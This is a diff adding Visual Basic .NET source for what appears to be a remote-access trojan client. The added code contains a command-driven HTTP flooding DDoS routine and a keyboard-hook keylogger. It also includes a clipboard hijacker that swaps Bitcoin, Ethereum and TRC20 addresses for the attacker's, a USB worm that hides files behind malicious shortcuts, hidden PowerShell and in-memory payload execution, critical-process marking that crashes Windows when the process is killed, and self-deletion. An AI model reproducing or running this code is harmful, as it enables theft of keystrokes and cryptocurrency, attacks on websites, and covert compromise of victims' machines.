+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+        Public Shared Sub SendError(ByVal msg As String)
+            Try
+                ClientSocket.Send("Error" & Settings.SPL & msg)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+        Public Shared DDos As Threading.Thread
+        Public Shared ReportWindow As Threading.Thread
+        Public Shared Sub TD(ByVal Input As String)
+            Try
+
+                Dim Host As String = Input.Split(":")(0)
+                Dim Port As String = Input.Split(":")(1)
+                Dim Timeout As Integer = Convert.ToInt32(Input.Split(":")(2)) * 60
+
+                Dim timespan As TimeSpan = TimeSpan.FromSeconds(Timeout)
+                Dim stopwatch As Stopwatch = New Stopwatch()
+                stopwatch.Start()
+
+                Debug.WriteLine("Host:" & Host & " Port:" & Port & " Timeout:" & Timeout)
+
+                While timespan > stopwatch.Elapsed AndAlso ClientSocket.isConnected
+                    For i As Integer = 0 To 20 - 1
+                        Dim D1 As New Threading.Thread(Sub()
+                                                           Try
+                                                               Dim s As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                                                               s.Connect((Host), Convert.ToInt32(Port))
+                                                               Dim post As String = "POST / HTTP/1.1" & vbCrLf & "Host: " & Host & vbCrLf & "Connection: keep-alive" & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "User-Agent: " & userAgents(New Random().[Next](userAgents.Length)) & vbCrLf & "Content-length: 5235" & vbCrLf & vbCrLf
+                                                               Dim buffer As Byte() = Encoding.UTF8.GetBytes(post)
+                                                               s.Send(buffer, 0, buffer.Length, SocketFlags.None)
+                                                               Thread.Sleep(2500)
+                                                               s.Dispose()
+                                                           Catch ex As Exception
+                                                               Debug.WriteLine("Website may be down!")
+                                                           End Try
+                                                       End Sub)
+                        D1.Start()
+                    Next
+                    Thread.Sleep(5000)
+                End While
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+
+        Public Shared Sub Monitoring(ByVal Data As String)
+            Dim Title As New List(Of String)
+            Dim k As Object
+            For Each k In Strings.Split(Data, ",")
+                Title.Add(k.ToLower)
+            Next
+            Dim count As Integer = 30
+            While ClientSocket.isConnected
+                For Each window As Process In Process.GetProcesses()
+                    If String.IsNullOrEmpty(window.MainWindowTitle) Then Continue For
+
+                    If Title.Any(AddressOf window.MainWindowTitle.ToLower().Contains) AndAlso count > 30 Then
+                        count = 0
+                        SendMSG("Open [" & window.MainWindowTitle.ToLower() & "]")
+                    End If
+                Next
+                count += 1
+                Thread.Sleep(1000)
+            End While
+        End Sub
+        Public Shared Sub OpenUrl(Url As String, Hidden As Boolean)
+            If Hidden Then
+                Try
+                    ServicePointManager.Expect100Continue = True
+                    ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
+                    ServicePointManager.DefaultConnectionLimit = 9999
+                Catch
+                End Try
+                Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(Url), HttpWebRequest)
+                httpWebRequest.UserAgent = userAgents(New Random().[Next](userAgents.Length))
+                httpWebRequest.AllowAutoRedirect = True
+                httpWebRequest.Timeout = 10000
+                httpWebRequest.Method = "GET"
+                Using CType(httpWebRequest.GetResponse(), HttpWebResponse)
+                End Using
+            Else
+                Process.Start(Url)
+            End If
+        End Sub
+
+        <DllImport("avicap32.dll", EntryPoint:="capCreateCaptureWindowA")>
+        Public Shared Function capCreateCaptureWindowA(ByVal lpszWindowName As String, ByVal dwStyle As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hwndParent As Integer, ByVal nID As Integer) As IntPtr
+        End Function
+        Public Shared Handle As IntPtr
+        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
+        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
+        End Function
+        Public Shared Function Cam() As Boolean
+            Try
+                Dim num As Integer = 0
+                Do
+                    Dim lpszVer As String = Nothing
+                    If capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
+                        Return True
+                    End If
+                    num += 1
+                Loop While (num <= 4)
+            Catch exception1 As Exception
+            End Try
+            Return False
+        End Function
+        Private Shared Sub RunDisk(ByVal Extension As String, ByVal Data As Byte())
+            Dim NewFile = Path.Combine(Path.GetTempPath(), GetRandomString(6) & Extension)
+            File.WriteAllBytes(NewFile, Data)
+            Threading.Thread.Sleep(500)
+            If Extension.ToLower.EndsWith(".ps1") Then
+                Dim PSInfo As New ProcessStartInfo("powershell.exe")
+                PSInfo.WindowStyle = ProcessWindowStyle.Hidden
+                PSInfo.Arguments = "-ExecutionPolicy Bypass -File " & """" & NewFile & """"
+                Dim PS As Process = Process.Start(PSInfo)
+            Else
+                Process.Start(NewFile)
+            End If
+        End Sub
+        Private Shared Function Memory(ByVal buffer As Byte())
+            Try
+                Dim asm As Assembly = AppDomain.CurrentDomain.Load(buffer)
+                Dim Metinf As MethodInfo = asm.EntryPoint
+                Dim InjObj As Object = asm.CreateInstance(Metinf.Name)
+                Dim parameters As Object() = New Object(0) {}
+                If Metinf.GetParameters().Length = 0 Then parameters = Nothing
+                Metinf.Invoke(InjObj, parameters)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Function
+
+    End Class
+
+    Public Class Uninstaller
+        Public Shared Sub UNS(ByVal IsUpdate As Boolean, ByVal Str As String, ByVal B As Byte())
+
+            If IsUpdate Then
+                Try
+
+                    Str = Path.Combine(Path.GetTempPath(), GetRandomString(6) & Str)
+                    File.WriteAllBytes(Str, B)
+                Catch ex As Exception
+                    Debug.WriteLine(ex.Message)
+                End Try
+            End If
+
+
+#If RegAdd Or Schtasks Or Startup Then
+            Try
+                IO.File.Delete(Settings.InstallDir & "\" & Settings.InstallStr)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+#If RegAdd Then
+            Try
+                Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+                key.DeleteValue(IO.Path.GetFileNameWithoutExtension(Settings.InstallStr), False)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+
+#If Schtasks Then
+            Try
+                Process.Start(New ProcessStartInfo() With {
+                .FileName = "schtasks",
+                .Arguments = "/delete /f  /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.InstallStr) & """",
+                .WindowStyle = ProcessWindowStyle.Hidden,
+                .CreateNoWindow = True
+                })
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+
+#If Startup Then
+            Try
+                Dim LNKPath As String = Environment.GetFolderPath(7) & "\" & IO.Path.GetFileNameWithoutExtension(Settings.InstallStr) & ".lnk"
+                If IO.File.Exists(LNKPath) Then
+                    fileStream.Close()
+                    IO.File.Delete(LNKPath)
+                End If
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+#If USBLNK Then
+
+            USB.USBStop()
+
+            Try
+                Dim myd As DriveInfo
+                Dim strDir As String
+                For Each myd In DriveInfo.GetDrives
+                    If myd.IsReady Then
+                        If myd.DriveType = IO.DriveType.Removable Then
+                            strDir = myd.Name
+                            Try
+                                Shell("attrib -h -s " & strDir & "*.*" & " /s /d", vbHide)
+                                IO.File.Delete(strDir & Settings.USBNM)
+                            Catch ex As Exception
+                                Debug.WriteLine(ex.Message)
+                            End Try
+
+                            Dim fileEntries As String() = Directory.GetFiles(strDir, "*.lnk")
+                            Dim Filename As Object
+                            For Each Filename In fileEntries
+                                Try
+                                    IO.File.Delete(Filename)
+                                Catch ex As Exception
+                                    Debug.WriteLine(ex.Message)
+                                End Try
+                            Next
+                            strDir = Nothing
+                        End If
+                    End If
+                Next
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+
+#If BDOS Then
+            ProcessCritical.CriticalProcesses_Disable()
+#End If
+
+
+            Try
+                Dim batch As String = Path.GetTempFileName() & ".bat"
+                Using sw As StreamWriter = New StreamWriter(batch)
+                    sw.WriteLine("@echo off")
+                    sw.WriteLine("timeout 3 > NUL")
+                    sw.WriteLine("CD " & Application.StartupPath)
+                    sw.WriteLine("DEL " & """" & Path.GetFileName(Application.ExecutablePath) & """" & " /f /q")
+                    sw.WriteLine("CD " & Path.GetTempPath())
+                    sw.WriteLine("DEL " & """" & Path.GetFileName(batch) & """" & " /f /q")
+                End Using
+
+                If IsUpdate Then
+                    Try
+                        Process.Start(Str)
+                    Catch
+                    End Try
+                End If
+
+                Process.Start(New ProcessStartInfo() With {
+                .FileName = batch,
+                .CreateNoWindow = True,
+                .ErrorDialog = False,
+                .UseShellExecute = False,
+                .WindowStyle = ProcessWindowStyle.Hidden
+            })
+                Environment.Exit(0)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+    End Class
+
+
+#If USBLNK Then
+    Public Class USB
+
+        Private Shared USBThread As Threading.Thread
+
+        Public Shared Sub USBStart()
+            Try
+                USBThread = New Threading.Thread(AddressOf USBCode, 1)
+                USBThread.Start()
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+
+        Public Shared Sub USBStop()
+            Try
+                USBThread.Abort()
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+        Private Shared Sub USBCode()
+
+            Dim shellobj As Object = CreateObject("wscript.shell")
+
+            Dim Drive As String
+
+            While True
+                On Error Resume Next
+
+                Dim Key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
+                If Key.GetValue("ShowSuperHidden") = 1 Then
+                    Key.SetValue("ShowSuperHidden", 0)
+                End If
+
+                Dim myd As DriveInfo
+                For Each myd In DriveInfo.GetDrives
+                    If myd.IsReady Then
+                        If myd.DriveType = IO.DriveType.Removable Then
+                            Drive = myd.Name
+
+
+                            If Not IO.File.Exists(Drive & Settings.USBNM) Then
+                                IO.File.WriteAllBytes(Drive & Settings.USBNM, IO.File.ReadAllBytes(current))
+                                IO.File.SetAttributes(Drive & Settings.USBNM, IO.FileAttributes.Hidden + IO.FileAttributes.System)
+                            End If
+
+
+                            For Each Files As String In IO.Directory.GetFiles(Drive)
+                                If IO.Path.GetExtension(Files).ToLower <> ".lnk" And Files.ToLower <> Drive.ToLower & Settings.USBNM.ToLower Then
+                                    IO.File.SetAttributes(Files, IO.FileAttributes.Hidden + IO.FileAttributes.System)
+                                    With shellobj.CreateShortcut(Drive & New IO.FileInfo(Files).Name & ".lnk")
+                                        .windowstyle = 7
+                                        .TargetPath = "cmd.exe"
+                                        .WorkingDirectory = ""
+                                        .Arguments = "/c start " & Settings.USBNM.Replace(" ", ChrW(34) _
+                                     & " " & ChrW(34)) & "&start " & New IO.FileInfo(Files) _
+                                    .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
+                                        Dim Fileicon = shellobj.regread("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread("HKEY_LOCAL_MACHINE\software\classes\." & Split(IO.Path.GetFileName(Files), ".")(UBound(Split(IO.Path.GetFileName(Files), "."))) & "\") & "\defaulticon\")
+                                        Dim current = shellobj.CreateShortcut(Drive & New IO.FileInfo(Files).Name & ".lnk").IconLocation
+                                        If InStr(Fileicon, ",") = 0 Then
+                                            .iconlocation = Files
+                                        Else
+                                            .iconlocation = Fileicon
+                                        End If
+
+                                        If Not .iconlocation = current Then
+                                            .Save()
+                                        End If
+
+                                        current = Nothing
+                                        Fileicon = Nothing
+                                    End With
+                                End If
+                            Next
+
+                            For Each Folders As String In IO.Directory.GetDirectories(Drive)
+                                IO.File.SetAttributes(Folders, IO.FileAttributes.Hidden + IO.FileAttributes.System)
+
+
+                                With shellobj.CreateShortcut(Drive & IO.Path.GetFileNameWithoutExtension(Folders) & " .lnk")
+                                    .windowstyle = 7
+                                    .TargetPath = "cmd.exe"
+                                    .WorkingDirectory = ""
+                                    .arguments = "/c start " & Replace(Settings.USBNM, " ", ChrW(34) & " " & ChrW(34)) & "&start explorer " & Replace(New _
+                                 IO.DirectoryInfo(Folders).Name, " ", ChrW(34) & " " & ChrW(34)) & "&exit"
+
+                                    Dim Foldericon = shellobj.regread("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\")
+                                    Dim current = shellobj.CreateShortcut(Drive & IO.Path.GetFileNameWithoutExtension(Folders) & " .lnk").IconLocation
+                                    If InStr(Foldericon, ",") = 0 Then
+                                        .IconLocation = Folders
+                                    Else
+                                        .IconLocation = Foldericon
+                                    End If
+
+                                    If Not .iconlocation = current Then
+                                        .Save()
+                                    End If
+
+                                    current = Nothing
+                                    Foldericon = Nothing
+                                End With
+                            Next
+                        End If
+                    End If
+                Next
+                Threading.Thread.CurrentThread.Sleep(5000)
+            End While
+        End Sub
+    End Class
+#End If
+
+#If Logger Then
+    Public Class XLogger
+        Private Shared CurrentActiveWindowTitle As String
+        Public Shared Sub callk()
+            _hookID = SetHook(_proc)
+            Application.Run()
+        End Sub
+
+        Private Shared Function SetHook(ByVal proc As LowLevelKeyboardProc) As IntPtr
+            Using curProcess As Process = Process.GetCurrentProcess()
+                Return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0)
+            End Using
+        End Function
+
+        Private Shared Function HookCallback(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
+            If nCode >= 0 AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
+                Dim vkCode = Marshal.ReadInt32(lParam)
+                Dim capsLock = (GetKeyState(&H14) And &HFFFF) <> 0
+                Dim shiftPress = (GetKeyState(&HA0) And &H8000) <> 0 OrElse (GetKeyState(&HA1) And &H8000) <> 0
+                Dim currentKey = KeyboardLayout(vkCode)
+
+                If capsLock OrElse shiftPress Then
+                    currentKey = currentKey.ToUpper()
+                Else
+                    currentKey = currentKey.ToLower()
+                End If
+
+                If CType(vkCode, Keys) >= Keys.F1 AndAlso CType(vkCode, Keys) <= Keys.F24 Then
+                    currentKey = "[" & CType(vkCode, Keys) & "]"
+                Else
+                    Select Case CType(vkCode, Keys).ToString()
+                        Case "Space"
+                            currentKey = "[SPACE]"
+                        Case "Return"
+                            currentKey = "[ENTER]"
+                        Case "Escape"
+                            currentKey = "[ESC]"
+                        Case "LControlKey"
+                            currentKey = "[CTRL]"
+                        Case "RControlKey"
+                            currentKey = "[CTRL]"
+                        Case "RShiftKey"
+                            currentKey = "[Shift]"
+                        Case "LShiftKey"
+                            currentKey = "[Shift]"
+                        Case "Back"
+                            currentKey = "[Back]"
+                        Case "LWin"
+                            currentKey = "[WIN]"
+                        Case "Tab"
+                            currentKey = "[Tab]"
+                        Case "Capital"
+                            If capsLock = True Then
+                                currentKey = "[CAPSLOCK: OFF]"
+                            Else
+                                currentKey = "[CAPSLOCK: ON]"
+                            End If
+                    End Select
+                End If
+
+                Using sw As StreamWriter = New StreamWriter(Settings.LoggerPath, True)
+                    If Equals(CurrentActiveWindowTitle, GetActiveWindowTitle()) Then
+                        sw.Write(currentKey)
+                    Else
+                        sw.WriteLine(Environment.NewLine)
+                        sw.WriteLine("###  " & GetActiveWindowTitle() & " ###")
+                        sw.Write(currentKey)
+                    End If
+                End Using
+            End If
+            Return CallNextHookEx(_hookID, nCode, wParam, lParam)
+        End Function
+
+        Private Shared Function KeyboardLayout(ByVal vkCode As UInteger) As String
+            Dim processId As UInteger = Nothing
+            Try
+                Dim sb As StringBuilder = New StringBuilder()
+                Dim vkBuffer = New Byte(255) {}
+                If Not GetKeyboardState(vkBuffer) Then Return ""
+                Dim scanCode = MapVirtualKey(vkCode, 0)
+                Dim lKeyboardLayout As IntPtr = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), processId))
+                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, lKeyboardLayout)
+                Return sb.ToString()
+            Catch
+            End Try
+            Return CType(vkCode, Keys).ToString()
+        End Function
+
+        Private Shared Function GetActiveWindowTitle() As String
+            Dim pid As UInteger = Nothing
+            Try
+                Dim hwnd As IntPtr = GetForegroundWindow()
+                GetWindowThreadProcessId(hwnd, pid)
+                Dim p = Process.GetProcessById(pid)
+                Dim title = p.MainWindowTitle
+                If String.IsNullOrWhiteSpace(title) Then title = p.ProcessName
+                CurrentActiveWindowTitle = title
+                Return title
+            Catch __unusedException1__ As Exception
+                Return "???"
+            End Try
+        End Function
+
+
+#Region "Hooks & Native Methods"
+        Private Const WM_KEYDOWN As Integer = &H100
+        Private Shared _proc As LowLevelKeyboardProc = AddressOf HookCallback
+        Private Shared _hookID As IntPtr = IntPtr.Zero
+
+        <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
+        Private Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr
+        End Function
+        <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
+        Private Shared Function UnhookWindowsHookEx(ByVal hhk As IntPtr) As Boolean
+        End Function
+
+        <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
+        Private Shared Function CallNextHookEx(ByVal hhk As IntPtr, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
+        End Function
+
+        <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
+        Private Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
+        End Function
+        Private Shared WHKEYBOARDLL As Integer = 13
+
+        Private Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
+
+        <DllImport("user32.dll")>
+        Private Shared Function GetForegroundWindow() As IntPtr
+        End Function
+
+        <DllImport("user32.dll", SetLastError:=True)>
+        Private Shared Function GetWindowThreadProcessId(ByVal hWnd As IntPtr, <Out> ByRef lpdwProcessId As UInteger) As UInteger
+        End Function
+
+        <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True, CallingConvention:=CallingConvention.Winapi)>
+        Private Shared Function GetKeyState(ByVal keyCode As Integer) As Short
+        End Function
+
+        <DllImport("user32.dll", SetLastError:=True)>
+        Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
+        End Function
+
+        <DllImport("user32.dll")>
+        Private Shared Function GetKeyboardLayout(ByVal idThread As UInteger) As IntPtr
+        End Function
+
+        <DllImport("user32.dll")>
+        Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(),
+            <Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, ByVal dwhkl As IntPtr) As Integer
+        End Function
+
+        <DllImport("user32.dll")>
+        Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
+        End Function
+#End Region
+    End Class
+#End If
+
+#If Clipper Then
+    Friend Module Clipper
+
+        Public ReadOnly BTCRegex As Regex = New Regex("\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
+        Public ReadOnly ETHRegex As Regex = New Regex("\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")
+        Public ReadOnly TRCRegex As Regex = New Regex("T[A-Za-z1-9]{33}")
+        Public NotInheritable Class NativeMethods
+            <DllImport("user32.dll", SetLastError:=True)>
+            Public Shared Function AddClipboardFormatListener(ByVal hwnd As IntPtr) As Boolean
+            End Function
+
+            <DllImport("user32.dll", SetLastError:=True)>
+            Public Shared Function SetParent(ByVal hWndChild As IntPtr, ByVal hWndNewParent As IntPtr) As IntPtr
+            End Function
+
+            Public Const clp As Integer = &H31D
+            Public Shared intpreclp As IntPtr = New IntPtr(-3)
+        End Class
+        Public Sub Run()
+            Application.Run(New ClipboardNotification.NotificationForm())
+        End Sub
+    End Module
+    Public Module ClipboardFunc
+        Public Function GetText() As String
+            Dim ReturnValue As String = String.Empty
+            Dim STAThread As Thread = New Thread(Sub() ReturnValue = Clipboard.GetText())
+            STAThread.SetApartmentState(ApartmentState.STA)
+            STAThread.Start()
+            STAThread.Join()
+
+            Return ReturnValue
+        End Function
+
+        Public Sub SetText(ByVal txt As String)
+            Dim STAThread As Thread = New Thread(Sub() Clipboard.SetText(txt))
+            STAThread.SetApartmentState(ApartmentState.STA)
+            STAThread.Start()
+            STAThread.Join()
+        End Sub
+    End Module
+    Public NotInheritable Class ClipboardNotification
+        Public Class NotificationForm
+            Inherits Form
+
+            Private Shared currentClipboard As String = GetText()
+            Public Sub New()
+                NativeMethods.SetParent(Handle, NativeMethods.intpreclp)
+                NativeMethods.AddClipboardFormatListener(Handle)
+            End Sub
+
+            Private Function RegexResult(ByVal pattern As Regex) As Boolean
+                If pattern.Match(currentClipboard).Success Then
+                    Return True
+                Else
+                    Return False
+                End If
+            End Function
+
+            Protected Overrides Sub WndProc(ByRef m As Message)
+                If m.Msg = NativeMethods.clp Then
+                    currentClipboard = GetText()
+
+                    If RegexResult(BTCRegex) AndAlso Not currentClipboard.Contains(Settings.BTC) Then
+                        Dim result = BTCRegex.Replace(currentClipboard, Settings.BTC)
+                        SetText(result)
+                        Messages.SendMSG("BTC Clipper " & currentClipboard & " : " & result)
+                    End If
+
+
+                    If RegexResult(ETHRegex) AndAlso Not currentClipboard.Contains(Settings.ETH) Then
+                        Dim result = ETHRegex.Replace(currentClipboard, Settings.ETH)
+                        SetText(result)
+                        Messages.SendMSG("ETH Clipper " & currentClipboard & " : " & result)
+                    End If
+
+
+                    If RegexResult(TRCRegex) AndAlso Not currentClipboard.Contains(Settings.TRC) Then
+                        Dim result = TRCRegex.Replace(currentClipboard, Settings.TRC)
+                        SetText(result)
+                        Messages.SendMSG("TRC20 Clipper " & currentClipboard & " : " & result)
+                    End If
+
+                End If
+                MyBase.WndProc(m)
+            End Sub
+            Protected Overrides ReadOnly Property CreateParams As CreateParams
+                Get
+                    Dim cp = MyBase.CreateParams
+                    cp.ExStyle = cp.ExStyle Or &H80
+                    Return cp
+                End Get
+            End Property
+        End Class
+    End Class
+#End If
+
+
+#If BDOS Then
+    Public Class ProcessCritical
+        <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)> Public Shared Sub SetCurrentProcessIsCritical(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
+        End Sub
+        Public Shared Sub SystemEvents_SessionEnding(ByVal sender As Object, ByVal e As SessionEndingEventArgs)
+            CriticalProcesses_Disable()
+        End Sub
+        Public Shared Sub CriticalProcess_Enable()
+            Try
+                AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf SystemEvents_SessionEnding)
+                Dim refWasCritical As Boolean
+                System.Diagnostics.Process.EnterDebugMode()
+                SetCurrentProcessIsCritical(True, refWasCritical, False)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+        Public Shared Sub CriticalProcesses_Disable()
+            Try
+                Dim refWasCritical As Boolean
+                SetCurrentProcessIsCritical(False, refWasCritical, False)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+    End Class
+#End If
+
+
+    Public Class AlgorithmAES
+        Public Shared Function Decrypt(ByVal input As String)
+            Dim AES As New RijndaelManaged
+            Dim Hash_AES As New MD5CryptoServiceProvider
+            Dim decrypted As String = ""
+            Dim hash(31) As Byte
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(Settings.Mutex))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 16)
+            AES.Key = hash
+            AES.Mode = CipherMode.ECB
+            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
+            Dim Buffer As Byte() = Convert.FromBase64String(input)
+            decrypted = BS(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
+            Return decrypted
+        End Function
+    End Class
+
+    Module Helper
+
+        Public ProcessDpi As Boolean = False
+
+        <DllImport("SHCore.dll", SetLastError:=True)>
+        Public Function SetProcessDpiAwareness(ByVal awareness As Integer) As Integer
+        End Function
+
+        Public Function IsValidDomainName(ByVal name As String) As Boolean
+            Return Uri.CheckHostName(name) <> UriHostNameType.Unknown
+        End Function
+
+#If Startup Then
+        Public fileStream As FileStream
+#End If
+
+
+        Private Const Alphabet As String = "abcdefghijklmnopqrstuvwxyz"
+        Public Random As Random = New Random()
+        Public ReadOnly PL As String = "Software\" & ID()
+        Public current As String = Process.GetCurrentProcess.MainModule.FileName
+        Public Function GetRandomString(ByVal length As Integer) As String
+            Dim randomName As StringBuilder = New StringBuilder(length)
+            For i As Integer = 0 To length - 1
+                randomName.Append(Alphabet(Random.[Next](Alphabet.Length)))
+            Next
+            Return randomName.ToString()
+        End Function
+        <StructLayout(LayoutKind.Sequential)>
+        Structure LASTINPUTINFO
+            <MarshalAs(UnmanagedType.U4)>
+            Public cbSize As Integer
+            <MarshalAs(UnmanagedType.U4)>
+            Public dwTime As Integer
+        End Structure
+        <DllImport("user32.dll")>
+        Public Function GetLastInputInfo(ByRef plii As LASTINPUTINFO) As Boolean
+        End Function
+
+        Dim idletime As Integer
+        Dim lastInputInf As New LASTINPUTINFO()
+        Public Function GetLastInputTime() As Integer
+            idletime = 0
+            lastInputInf.cbSize = Marshal.SizeOf(lastInputInf)
+            lastInputInf.dwTime = 0
+
+            If GetLastInputInfo(lastInputInf) Then
+                idletime = Environment.TickCount - lastInputInf.dwTime
+            End If
+
+            If idletime > 0 Then
+                Return idletime / 1000
+            Else : Return 0
+            End If
+        End Function
+
+        Public sumofidletime As TimeSpan = New TimeSpan(0)
+        Public LastLastIdletime As Integer
+        Public Time As String
+        Public Function LastAct()
+            While True
+                Threading.Thread.Sleep(1000)
+                Dim it As Integer = GetLastInputTime()
+                If LastLastIdletime > it Then
+                    sumofidletime = sumofidletime.Add(TimeSpan.FromSeconds(LastLastIdletime))
+                Else
+                    Time = GetLastInputTime()
+                End If
+                LastLastIdletime = it
+            End While
+        End Function
+
+        Public userAgents As String() = {"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"}
+
+        <DllImport("user32.dll")>
+        Public Function GetForegroundWindow() As IntPtr
+        End Function
+        <DllImport("user32.dll")>
+        Public Function GetWindowText(ByVal hWnd As IntPtr, ByVal text As StringBuilder, ByVal count As Integer) As Integer
+        End Function
+
+        <DllImport("kernel32.dll", SetLastError:=True)>
+        Public Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
+        End Function
+        Public Enum EXECUTION_STATE As UInteger
+            ES_CONTINUOUS = &H80000000UI
+            ES_DISPLAY_REQUIRED = &H2
+            ES_SYSTEM_REQUIRED = &H1
+        End Enum
+        Public Sub PreventSleep()
+            Try
+                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED)
+            Catch
+            End Try
+        End Sub
+
+        Public Function GetActiveWindowTitle() As String
+            Try
+                Const nChars As Integer = 256
+                Dim buff As StringBuilder = New StringBuilder(nChars)
+                Dim handle As IntPtr = GetForegroundWindow()
+
+                If GetWindowText(handle, buff, nChars) > 0 Then
+                    Return buff.ToString()
+                End If
+            Catch
+            End Try
+            Return ""
+        End Function
+        Function SB(ByVal s As String) As Byte()
+            Return System.Text.Encoding.UTF8.GetBytes(s)
+        End Function
+
+        Function BS(ByVal b As Byte()) As String
+            Return System.Text.Encoding.UTF8.GetString(b)
+        End Function
+        Public Function ID() As String
+            Try
+                Return GetHashT(String.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, New DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize))
+            Catch
+                Return "Err HWID"
+            End Try
+        End Function
+        Public Function GetHashT(ByVal strToHash As String) As String
+            Dim md5Obj As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
+            Dim bytesToHash As Byte() = Encoding.ASCII.GetBytes(strToHash)
+            bytesToHash = md5Obj.ComputeHash(bytesToHash)
+            Dim strResult As StringBuilder = New StringBuilder()
+            For Each b As Byte In bytesToHash
+                strResult.Append(b.ToString("x2"))
+            Next
+            Return strResult.ToString().Substring(0, 20).ToUpper()
+        End Function
+
+
+        Public Function SetValue(ByVal name As String, ByVal value As Byte()) As Boolean
+            Try
+
+                Using key As RegistryKey = Registry.CurrentUser.CreateSubKey(PL, RegistryKeyPermissionCheck.ReadWriteSubTree)
+                    key.SetValue(name, value, RegistryValueKind.Binary)
